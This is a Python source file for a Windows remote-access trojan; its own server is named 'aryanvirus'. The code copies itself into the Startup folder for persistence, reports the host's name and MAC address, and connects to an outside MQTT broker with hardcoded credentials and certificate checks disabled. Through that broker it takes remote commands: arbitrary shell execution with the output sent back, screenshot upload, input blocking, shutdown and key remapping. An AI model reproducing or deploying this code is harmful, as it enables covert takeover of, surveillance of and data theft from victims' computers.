import paho.mqtt.client as mqtt
import threading
import socket
import uuid
import time
import pyautogui as pg
import keyboard
import os
import subprocess
import webbrowser
import requests
import shutil
from pathlib import Path
import sys
import ssl

# Function imports
import blockInput
from notepadType import notepad_write
from prompt import alertPrompt, inputPrompt

# Startup setup
FLAG_FILE = Path(os.getenv('APPDATA')) / "my_program_first_run.flag"

def add_to_startup():
    try:
        startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        exe_path = Path(sys.argv[0]).resolve()
        destination = startup_dir / exe_path.name
        if not destination.exists():
            shutil.copy(exe_path, destination)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if not FLAG_FILE.exists():
    add_to_startup()
    FLAG_FILE.touch()

# Server / MQTT settings
# serverUrl = "http://localhost:3000"s
serverUrl = "https://aryanvirus.onrender.com"
BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
PORT = 8883
USERNAME = "aryanvish2006"
PASSWORD = "aryanvish2006saniya"

POLL_INTERVAL = 60

# PC identification
pc_name = socket.gethostname()
mac = hex(uuid.getnode())
pc_id = f"{pc_name}_{mac}"

# MQTT topics
CONTROL_TOPIC = f"control/{pc_id}"
ACK_TOPIC = f"ack/{pc_id}"

# Poll server
# def should_connect():
#     try:
#         r = requests.get(f"{serverUrl}/shouldconnect", timeout=5)
#         return bool(r.json().get("connect"))
#     except:
#         return False

# Screenshot
def take_screenshot():
    try:
        filename = f"{pc_name}_screenshot.png"
        pg.screenshot(filename)
        with open(filename, "rb") as f:
            requests.post(f"{serverUrl}/upload", files={"screenshot": f})
        os.remove(filename)
    except:
        pass

# Handle all messages
def handle_msg(msg):
    try:
        msg = msg.lower()
        if msg == "block":
            blockInput.start_block("both")
        elif msg == "blockkeyboard":
            blockInput.start_block("keyboard")
        elif msg == "blockmouse":
            blockInput.start_block("mouse")
        elif msg == "unblock":
            blockInput.unblock_all()
        elif msg == "shutdown":
            os.system("shutdown /s /t 0")
        elif msg == "desktop":
            pg.hotkey("win", "d")
        elif msg == "close":
            keyboard.send("alt+f4")
        elif msg == "screenshot":
            take_screenshot()
        elif msg == "lock":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        elif msg == "end":
            os._exit(0)
        elif msg.startswith("subprocess"):
            try:
                subprocess.run(msg[len("subprocess "):], shell=True)
            except:pass    
        elif msg.startswith("browser"):
            webbrowser.open(msg[len("browser "):])
        elif msg.startswith("type"):
            pg.typewrite(msg[len("type "):], 0.2)
        elif msg.startswith("notepadtypeheart"):
            notepad_write(msg[len("notepadtypeheart "):], True)
        elif msg.startswith("notepadtype"):
            notepad_write(msg[len("notepadtype "):], False)
        elif msg.startswith("press"):
            pg.press(msg[len("press "):])
        elif msg.startswith("alertprompt"):
            alertPrompt(msg[len("alertprompt "):])
        elif msg.startswith("inputprompt"):
            value = inputPrompt(msg[len("inputprompt "):])
            client.publish(ACK_TOPIC, value)
        elif msg.startswith("backspace"):
            for _ in range(int(msg[len("backspace "):])):
                pg.press("backspace")
                time.sleep(0.05)
        elif msg.startswith("blockkey"):
            keyboard.block_key(msg[len("blockkey "):])
        elif msg.startswith("unblockkey"):
            keyboard.unblock_key(msg[len("unblockkey "):])
        elif msg.startswith("remap"):
            keyboard.remap_key(msg[len("remap "):][0], msg[len("remap "):][1])
        elif msg.startswith("swapkey"):
            try:
                s = msg[len("swapkey "):].split()
                keyboard.remap_key(s[0], s[1])
                keyboard.remap_key(s[1], s[0])
            except:pass
        elif msg.startswith("cmdwithoutput"):
            try:
                result = subprocess.run(msg[len("cmdwithoutput "):], shell=True, capture_output=True, text=True)
                client.publish(ACK_TOPIC, result.stdout)
            except:pass
    except Exception as e:
        print(e)

# Send initial trace
def send_data():
    try:
        requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
    except:
        pass

def send_handler():
    threading.Thread(target=send_data).start()

keyboard.add_hotkey("ctrl+shift+q", send_handler)

# MQTT callbacks
def on_connect(client, userdata, flags, rc):
    print(f"{pc_id} Connected to MQTT broker, code: {rc}")
    client.subscribe(CONTROL_TOPIC)
    client.publish(ACK_TOPIC, f"{pc_id} Connected")

def on_message(client, userdata, msg):
    message = msg.payload.decode()
    print(f"Received: {message}")
    handle_msg(message)
    client.publish(ACK_TOPIC, f"ACK:{pc_id}")

# MQTT client setup
client = mqtt.Client()
client.username_pw_set(USERNAME, PASSWORD)
client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)
client.on_connect = on_connect
client.on_message = on_message


# client.connect(BROKER, PORT, 60)

# client.loop_forever()

while True:
    try:
        client.connect(BROKER, PORT, 60)
        client.loop_forever()
    except Exception as e:
        print(f"MQTT connection failed: {e}. Retrying in 5 seconds...")
        time.sleep(5)

# Poll server loop
# def poll_loop():
#     while True:
#         if should_connect():
#             if not client.is_connected():
#                 print(f"{pc_id}: Server says connect -> Connecting MQTT")
#                 client.reconnect()  # reconnect if disconnected
#         else:
#             if client.is_connected():
#                 print(f"{pc_id}: Server says No connect -> Disconnecting MQTT")
#                 client.disconnect()
#         time.sleep(POLL_INTERVAL)


# threading.Thread(target=poll_loop, daemon=True).start()

# Run MQTT loop

